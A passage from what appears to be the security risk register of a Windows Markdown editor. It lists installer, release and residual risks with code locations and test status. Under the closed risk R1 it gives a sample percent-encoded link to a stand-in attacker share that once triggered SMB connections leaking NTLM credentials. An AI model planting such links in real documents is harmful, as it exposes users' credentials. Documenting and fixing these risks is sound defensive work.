| The uninstaller deletes another user's data | Default answer "No"; an all-users installation does not browse other profiles and deletes nothing; silent mode does not delete; the portable data folder is never touched | `installer/Makdon.iss:158-185` | Manual test (TESTING.md), no automated test |
| Installation overwrites or deletes files belonging to a shared folder | No wildcard `[InstallDelete]`; the uninstaller only deletes files recorded at installation | `installer/Makdon.iss:80` | Manual test, **not verified** |
| The installer also installs the portable marker (the application wrongly thinks it is portable) | `Excludes` in `[Files]`; `#if FileExists` in `Makdon.iss` refuses a publish folder that contains it; `build-release.ps1` removes the marker from the material and checks for it (step 6a) | `installer/Makdon.iss:22-25, 80`; `scripts/build-release.ps1:129, 155-158` | `-VerifyInstallerContents` in CI; no other automated test |
| Release files are replaced in transit | `SHA256SUMS.txt`, build provenance attestation (`actions/attest-build-provenance`), and the release is published from a draft. Immutable releases are **not verified** (repo setting) | `.github/workflows/release.yml`; `scripts/build-release.ps1:220-230` | No automated test |
| Release is not signed | Checksums and SmartScreen/Smart App Control guidance in the README. **Residual risk R16** | README, "SmartScreen and Smart App Control warnings" section | - |

## 3. Residual risk and known limitations

Found while reading the code. Risks that have been fixed were moved to [section 4](#4-risks-already-closed); the numbers R2-R13 were not changed so that old references remain valid.

| # | Risk / limitation | Basis in code | Verification status |
| --- | --- | --- | --- |
| R1 | Closed; see [section 4](#4-risks-already-closed). | - | - |
| R2 | Clicking an `http(s)`/`mailto` link in the preview opens the shell **without confirmation** (`Process.Start` with `UseShellExecute`). Other schemes are ignored. | `DocumentView.xaml.cs:673-705` | Code; no test for `OnHyperlink` |
| R3 | The preview does not restrict local images to the document folder (only export does). Local images on any drive are displayed; there is no exfiltration, but an untrusted document can show other images from the user's machine on screen. | `MarkdownSupport.cs:174-197` | Code |
| R4 | With "Load remote images" on, `http(s)` reveals the IP and read time to the document author; URLs with credentials (`https://user:pw@host`) are passed as is. The exported HTML also still refers to remote `http(s)` images, so the recipient can be tracked. | `MarkdownSupport.cs:145-147, 237-240` | Code; `HttpVariants_*` tests |
| R5 | Export: the symlink-inside-pointing-outside branch is not tested. The image type is determined from the **extension**, not the content (a file named `.png` containing other data is still embedded as `image/png`; the impact is limited to `<img>`, **not verified** in browsers). | `MarkdownSupport.cs:328, 333-334` | Code |
| R6 | Writing through a symlink overwrites the **target file** (in another folder), not the link. This is intentional (`ResolveLinkTarget`), but a document symlinked to a sensitive file will overwrite it on save. | `TextFileIO.cs:143` | The symlink test only runs when symlink creation is allowed |
| R7 | The single-instance pipe is protected only by `CurrentUserOnly`; another process of the same user can open any absolute path as a tab (without execution). The pipe name is predictable (SID + session). Rejection of other users is not tested. | `SingleInstance.cs:61-62, 104-105` | Code |
| R8 | Reading, decoding, hashing, export, **direct Print (Ctrl+P)**, and regex run **synchronously on the UI thread**: large files or slow regex freeze the UI (up to 500 MB is read into memory; regex up to ~4 s + 2 s). Out-of-memory (OOM) is handled differently per path. Main preview: on the synchronous render (documents under 100k characters) OOM is deliberately allowed to escape and close the application through the fatal path; in `RenderInBackground` (>= 100k characters) OOM is caught and shown as an error document. **Direct Print** (`Print_Executed`) excludes OOM from its `catch`, so OOM while creating the document, counting pages, or printing falls through to the fatal path (other errors: message "Gagal mencetak." (failed to print)). **Print Preview**: `Guard` on `PreviewBuild` catches all errors including OOM, the cycle becomes `Failed`, the panel shows "Memori tidak cukup untuk menyusun pratinjau dokumen ini." (not enough memory to build the preview of this document) and the error is logged; OOM while creating its window is caught by `PrintPreview_Executed` with a friendly message. The Print button in the preview window (`dialog.PrintDocument`, synchronous) does not catch OOM (fatal path). Very large Markdown documents: WPF lays out one giant `FlowDocument` superlinearly and the UI can become unresponsive with memory up to about 1 GB (measured for the main preview; the figure is in the README, Known limitations; **not measured** for Print Preview). | `MainWindow.xaml.cs:20-21, 758-762, 778-783`, `SearchEngine.cs:24-25`, `DocumentView.xaml.cs:364, 406, 465, 475`, `PreviewBuild.cs:211-222`, `PrintPreviewWindow.xaml.cs:137-138, 449` | Code; Guard/OOM tests in `PreviewBuildTests.cs:468` (preview only); other OOM paths are not tested |
| R9 | An unsaved document is lost on a fatal error: only path/mode/caret enter the session; there is no autosave or draft recovery (README). | `MainWindow.xaml.cs:217-234`, README Known limitations | Code |
| R10 | `crash.log` contains paths and stack traces in plain text. | `CrashLog.cs:40-42` | Code |
| R11 | The theme key parity check and UI tests for the main window (`MainWindow`, `App`) are not automated; regressions there are not caught by tests. See [TESTING.md](TESTING.md#not-tested). | - | Code |
| R12 | Third-party dependencies (Markdig.Wpf 0.5.0.1, AvalonEdit 6.3.1.120, xUnit etc.) are pinned to fixed versions; CI runs only for releases (`.github/workflows/release.yml`), with no dependency vulnerability scanning. Publish output is not signed (R16). | `Makdon.csproj:45-46`; `.github/workflows/release.yml` | Code |
| R13 | Library behavior is not verified in the repo: that Markdig.Wpf ignores raw HTML, and that `MarkdownPipeline` is safe to use concurrently from the background thread and the UI thread (now also by the print snapshot parse on a background thread, which can run concurrently with the main preview render). | `DocumentView.xaml.cs:401`, `PrintLayout.cs:99` | **Not verified** |
| R14 | The `Switch.System.Windows.DisableXpsPackageBoundaryRestriction` switch disables the XPS package boundary restriction for the whole process (required by .NET 10, ADR-32). Impact is limited because Makdon only reads XPS it creates itself in memory; no path opens XPS from other files. | `src/Makdon/Makdon.csproj:41`, `src/Makdon.Tests/Makdon.Tests.csproj:26` | Code; `XpsBoundarySwitchTests` only checks configuration, not security behavior |
| R15 | Portable mode data (`data\settings.json`: list of recent files, session, document paths; `data\crash.log`: paths and stack traces) moves with the folder, including to removable media or a copy of the folder. The documents themselves are not copied. Not encrypted, same as `%APPDATA%`. | `AppPaths.cs:22, 35-41` | Code |
| R16 | Releases are not signed: SmartScreen and Smart App Control can block them; origin is proven only by checksums and attestation. Actions in `release.yml` are pinned to commit SHAs (values were matched with `git ls-remote`), Inno Setup 6.7.1 is installed through Chocolatey without verifying the installer checksum, and immutable releases are not verified. | `.github/workflows/release.yml` | **Not verified** |
| R17 | The "Open with" registration of the portable copy stores the exe path. If the portable folder is on media whose owner can be changed and the exe is replaced, every `.md` file opened through "Open with" runs the replacement exe. Startup only offers to update the path if the old exe is missing; it does not check its contents. | `FileAssociation.cs:127-175`, `MainWindow.xaml.cs:499-` | Code; no test for the case where the exe is replaced |

## 4. Risks already closed

| # | Original risk | Current control | Code location | Test |
| --- | --- | --- | --- | --- |
| R1 | **Clicking a relative/UNC link to a `.md` file could trigger network access.** `OnHyperlink` combined `Path.Combine(baseDir, Uri.UnescapeDataString(url))` and then called `File.Exists(target)` **before** checking the extension and without `IsAllowedLocalPath`. Original vector: percent-encoded relative links such as `[x](%5C%5Cattacker.example%5Cshare%5Cx.md)` or `%2F%2Fhost%2Fshare%2Fx.md` were decoded into a UNC path, so one click triggered an SMB connection (and NTLM credential transmission). An absolute `file:///C:/x.md` link also never worked (the raw URL string was combined with `Path.Combine`). | Resolution was split into `MarkdownSupport.ResolveLinkTarget(baseDir, url, out anchor)`, which **performs no I/O**. Order: a `file:` link without a host is converted with `Uri.LocalPath` (one with a host or UNC is rejected); other links are decoded and combined with the document folder; paths starting with `\?\` or `\.\` (also with `/`) are rejected both before and after `GetFullPath`; the extension must be markdown; then `IsAllowedLocalPath` (UNC only on the same share as the document; drive letters remain allowed). `OnHyperlink` calls `File.Exists` only if the helper returns a path. `#anchor` and `file.md#anchor` are still supported. | `MarkdownSupport.cs:361-412` (`ResolveLinkTarget`, `IsDevicePath`), `DocumentView.xaml.cs:707-711` | `LinkResolutionTests.cs`: `UncAndDevicePaths_AreRejected` (`%5C%5Chost...`, `%2F%2Fhost...`, encoded `\?\UNC\...`, `\.\pipe\x`), `SameShareDocument_StillRejectsOtherShares_AndDevicePaths`, `DocumentOnShare_AllowsLinksOnTheSameShare`, `LocalRelativeAndDriveLinks_Resolve`, `Anchor_IsSplitFromPath`, `FileUriWithoutHost_ResolvesToLocalPath`, `FileUriWithHost_IsRejected`, `NonMarkdown_IsRejected`, `NullEmptyAndAnchorOnly_ReturnNull`. The `OnHyperlink` wrapper itself remains without tests, and behavior against a real SMB share is not tested |
